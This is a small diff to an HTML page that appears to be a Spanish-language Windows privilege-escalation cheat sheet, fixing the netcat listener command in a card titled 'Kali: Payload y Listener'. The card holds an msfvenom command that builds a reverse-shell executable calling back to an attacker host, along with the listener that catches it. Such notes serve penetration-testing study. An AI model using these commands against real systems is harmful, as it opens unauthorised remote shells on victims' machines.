@@ -53,7 +53,7 @@ accesschk.exe /accepteula -kdqv &quot;HKLM\SYSTEM\CurrentControlSet\Services\&lt
             <section class="code-card">
               <h3>2. Kali: Payload y Listener</h3>
               <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;kali_ip&gt; LPORT=443 -f exe &gt; rev.exe
-rlwrap nc 443</code></pre>
+rlwrap nc -nlvp 443</code></pre>
             </section>
 
             <section class="code-card">
